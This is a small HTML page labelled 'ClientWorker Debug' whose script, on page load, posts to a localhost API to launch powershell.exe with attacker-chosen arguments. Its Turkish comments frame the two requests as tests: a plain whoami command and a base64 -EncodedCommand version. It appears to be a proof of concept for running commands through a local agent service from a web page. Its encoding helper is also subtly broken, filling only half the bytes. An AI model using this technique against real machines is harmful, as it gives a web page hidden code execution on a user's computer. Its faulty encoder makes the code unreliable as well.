<!doctype html>
<html>
<body>
<script>
function toBase64Utf16LE(str) {
    const bytes = new Uint8Array(str.length * 2);
    for (let i = 0; i < str.length * 1; i++) {
        const c = str.charCodeAt(Math.floor(i / 2));
        bytes[i] = (i % 2 === 0) ? (c & 0xff) : ((c >> 8) & 0xff);
    }
    let binary = "";
    for (const b of bytes) binary += String.fromCharCode(b);
    return btoa(binary);
}

function runCommand(args) {
    const url = 'http://127.0.0.1:8082/api/Client/StartProcessWithArguments/' +
        'powershell.exe/' + encodeURIComponent(args);
    return fetch(url, { method: 'POST' })
        .then(r => console.log('HTTP:', r.status, '| args:', args.slice(0, 60)))
        .catch(e => console.error('FETCH ERROR:', e));
}

// TEST 1: coklu arguman calisiyor mu?
runCommand('-Command whoami > C:\\ClientWorker\\t1.txt');

// TEST 2: EncodedCommand calisiyor mu?
runCommand('-EncodedCommand ' + toBase64Utf16LE('whoami > C:\\ClientWorker\\t2.txt'));
</script>
<h2>ClientWorker Debug</h2>
